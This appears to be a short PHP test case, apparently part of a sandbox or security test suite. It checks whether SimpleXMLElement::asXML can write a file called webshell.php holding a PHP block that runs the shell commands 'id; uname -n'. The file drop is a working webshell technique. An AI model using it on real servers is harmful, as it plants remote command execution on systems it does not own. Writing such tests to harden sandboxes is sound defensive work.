--TEST--
Arbitrary file write (webshell drop) via SimpleXMLElement::asXML with a path
--FILE--
<?php

$xml = "<?xml version=\"1.0\"?><r><?php system(\"id; uname -n\"); ?></r>";
$x   = new SimpleXMLElement($xml);
$x->asXML("/tmp/sbx3/webshell.php");
return "dropped";
